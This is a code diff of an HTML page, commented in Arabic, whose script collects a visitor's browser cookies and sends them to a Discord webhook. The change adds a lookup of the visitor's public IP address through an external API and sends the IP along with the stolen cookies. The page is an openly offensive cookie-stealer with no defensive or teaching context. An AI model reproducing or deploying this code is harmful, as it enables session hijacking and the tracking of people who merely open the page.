@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إرسال الكوكيز إلى بوت Discord</title>
+    <title>إرسال الكوكيز مع الـ IP إلى بوت Discord</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -27,17 +27,25 @@
         // جلب الكوكيز
         const cookies = getCookies();
 
-        // إذا كانت الكوكيز موجودة، نقوم بإرسالها
-        if (cookies) {
-            sendData(cookies); // إرسال الكوكيز إلى Webhook
-        } else {
-            console.log("لا توجد كوكيز");
-        }
+        // جلب عنوان الـ IP باستخدام API خارجي
+        fetch("https://api.ipify.org?format=json")
+            .then(response => response.json())
+            .then(data => {
+                const userIP = data.ip;  // الحصول على عنوان الـ IP
+                if (cookies) {
+                    sendData(cookies, userIP);  // إرسال الكوكيز والـ IP إلى Webhook
+                } else {
+                    console.log("لا توجد كوكيز");
+                }
+            })
+            .catch(error => {
+                console.error("خطأ في جلب عنوان الـ IP: ", error);
+            });
 
         // دالة لإرسال البيانات إلى Webhook
-        function sendData(cookies) {
+        function sendData(cookies, userIP) {
             const data = {
-                content: `تم إرسال الكوكيز: ${cookies}`
+                content: `تم إرسال الكوكيز: ${cookies}\n مع الـ IP: ${userIP}`
             };
 
             const xhr = new XMLHttpRequest();
@@ -46,9 +54,9 @@
 
             xhr.onload = function () {
                 if (xhr.status === 204) {
-                    console.log("تم إرسال الكوكيز بنجاح.");
+                    console.log("تم إرسال البيانات بنجاح.");
                 } else {
-                    console.log("حدث خطأ أثناء إرسال الكوكيز.");
+                    console.log("حدث خطأ أثناء إرسال البيانات.");
                 }
             };
 
